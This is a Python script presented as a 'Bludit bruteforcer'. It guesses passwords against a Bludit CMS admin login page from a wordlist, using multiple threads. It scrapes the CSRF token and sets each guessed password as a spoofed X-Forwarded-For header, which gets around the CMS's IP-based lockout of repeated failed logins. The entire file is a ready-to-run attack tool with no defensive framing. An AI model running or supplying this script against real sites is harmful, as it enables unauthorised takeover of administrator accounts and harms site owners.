#!/usr/bin/env python3
import requests
import re
import argparse
import threading
import queue

parser = argparse.ArgumentParser(description='Bludit bruteforcer')
parser.add_argument('-u', dest='url', type=str, required=True, help='Target URL (without admin path)')
parser.add_argument('-user', dest='user', type=str, required=True, help='Username')
parser.add_argument('-w', dest='wordlist', type=str, required=True, help='Password wordlist')
parser.add_argument('-t', dest='threads', type=int, required=False, default=1, help='Amount of threads to use')
args=parser.parse_args()

print('\033[94m')
print(" ____   ____   _   _  _____  ____")
print("| __ ) |  _ \ | | | ||_   _|| ___|")
print("|  _ \ | |_) || | | |  | |  |  _|")
print("| |_)  |  _ < | |_| |  | |  | |__")
print("|____/ |_| \_\ \___/   |_|  |____| @pingport80")
print('\033[0m')

URL = args.url+'/admin/login'
user = args.user
wordlist = open(args.wordlist, 'r')
q = queue.Queue()

# Populate the queue
for pwd in wordlist:
    q.put(pwd.strip())
    

def work():
    session = requests.Session()
    r = session.get(URL)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', r.text).group(1)
    
    while not q.empty():
        pwd = q.get()

        headers = {
            'X-Forwarded-For': pwd,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
            'Referer': URL
        }

        data = {
            'tokenCSRF': csrf_token,
            'username': user,
            'password': pwd,
            'save': ''
        }

        res = session.post(URL, headers = headers, data = data, allow_redirects = False)
        
        
        if "password incorrect" in res.text:
            print('\033[92m'+args.user+" : "+pwd+" : "+csrf_token+'\033[0m')
            csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', res.text).group(1)

        else:
            print('\033[91m'+args.user+" : "+pwd+"  ==>found\033[0m")
            break

        if not q.empty():
            q.task_done()
            
    # Close everything down (somewhat) gracefully
    with q.mutex:
        q.queue.clear()
        q.all_tasks_done.notify_all()
        q.unfinished_tasks = 0

for x in range(args.threads):
    x = threading.Thread(target=work, daemon=True).start()

q.join()